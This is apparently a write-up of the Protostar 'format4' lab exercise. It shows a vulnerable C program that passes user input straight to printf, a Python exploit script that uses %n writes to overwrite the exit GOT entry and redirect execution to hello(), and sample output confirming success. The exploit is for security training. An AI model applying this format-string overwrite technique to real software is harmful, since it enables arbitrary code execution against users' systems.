Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello(){
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln(){
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv){
  vuln();
}
```

Here is the exploit script (saved as `format4.exp.py`):
```python
import struct
targaddr=0x08049724 # Found using the command: objdump -R format4 | grep -i exit
helloval = 0x080484b4
tas = struct.pack('<I', targaddr)
tasp2 = struct.pack('<I', targaddr+2)
exp = ""
exp += tas
exp += tasp2
exp += '%33964x' # 0x84b4-8
exp += '%4$n'

exp += '%33616x' # 0x10804-0x84b4
exp += '%5$n'

print exp
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python ~/format4.exp.py | ./format4
$�&�
# A lot of spaces
                      200
# A lot of spaces
                                                      b7fd8420
code execution redirected! you win
```
